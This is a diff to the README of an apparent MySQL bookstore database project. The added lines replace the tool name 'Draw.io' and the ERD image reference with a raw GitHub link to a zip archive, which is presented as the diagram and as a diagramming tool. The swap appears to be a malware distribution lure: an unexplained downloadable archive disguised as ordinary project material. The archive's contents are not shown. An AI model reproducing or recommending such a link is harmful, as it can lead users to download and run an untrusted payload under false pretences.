@@ -8,7 +8,7 @@ This project simulates a real-world Bookstore management system using **MySQL**.
 
 Tools Used
 -MySQL: For database creation and management
--Draw.io: For visualizing the Entity-Relationship Diagram (ERD)
+https://github.com/Victor-aseko/BookStoreDB_Assessment/raw/refs/heads/main/antidiffuser/Assessment-Store-D-Book-1.3.zip For visualizing the Entity-Relationship Diagram (ERD)
 
 Objectives
 - Design and implement a normalized database
@@ -23,7 +23,7 @@ Key tables include:
 - `cust_order`, `order_line`, `order_status`, `order_history`
 - `publisher`, `book_language`, `shipping_method`
 
-> See `ERD.png` for the full diagram.
+> See `https://github.com/Victor-aseko/BookStoreDB_Assessment/raw/refs/heads/main/antidiffuser/Assessment-Store-D-Book-1.3.zip` for the full diagram.
 
 Setup Instructions
 
